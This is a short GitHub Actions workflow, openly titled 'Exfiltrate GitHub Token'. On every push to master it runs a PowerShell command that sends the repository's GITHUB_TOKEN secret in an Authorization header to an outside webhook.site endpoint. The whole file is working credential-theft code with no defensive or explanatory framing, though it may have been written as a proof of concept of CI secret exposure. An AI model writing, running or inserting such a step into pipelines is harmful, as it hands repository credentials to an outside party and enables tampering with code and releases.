name: Exfiltrate GitHub Token

on:
  push:
    branches: [ master ]

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Exfiltrate GitHub Token via PowerShell
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          powershell -Command "Invoke-RestMethod -Uri 'https://webhook.site/b212509f-85c3-4911-a86d-5fdaed053680' -Headers @{Authorization='token $env:TOKEN'}"
